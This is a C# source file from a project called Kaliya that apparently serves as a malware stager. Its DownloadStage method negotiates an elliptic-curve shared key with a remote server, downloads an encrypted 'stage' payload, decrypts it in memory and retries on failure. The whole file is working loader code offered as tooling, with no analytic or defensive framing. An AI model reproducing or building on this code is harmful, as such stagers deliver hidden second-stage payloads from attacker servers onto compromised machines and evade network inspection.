using System;
using System.IO;
using System.Numerics;
using System.Text;
using Kaliya.Crypto;
using Kaliya.Utils;
using Kaliya.Utils.Curve;
using Waher.Security;
using Waher.Security.EllipticCurves;

namespace Kaliya
{
    internal static class Core
    {
        public static MemoryStream DownloadStage(Uri url, int sleep = 1, int retries = 10)
        {
            return Retry.Do(() =>
            {
                var key = GetSharedKey(url);
                var stage = Aes.Decrypt(key, Http.Get(url));
                return new MemoryStream(stage);
            }, TimeSpan.FromSeconds(sleep), retries);
        }

        private static byte[] GetSharedKey(Uri uri)
        {
            var curve = new NistP521();
            
            var coords = new Coordinates()
            {
                X = curve.PublicKey.X.ToString(),
                Y = curve.PublicKey.Y.ToString()
            };

            var json = Actions.WriteJson(coords);

            var response = Encoding.UTF8.GetString(Http.Post(uri, Encoding.UTF8.GetBytes(json)));

            var remoteCoords = Actions.ParseJson((response));
            var remotePoint = new PointOnCurve(BigInteger.Parse(remoteCoords.X), BigInteger.Parse(remoteCoords.Y));
            
            return curve.GetSharedKey(remotePoint, HashFunction.SHA256);
        }
    }
}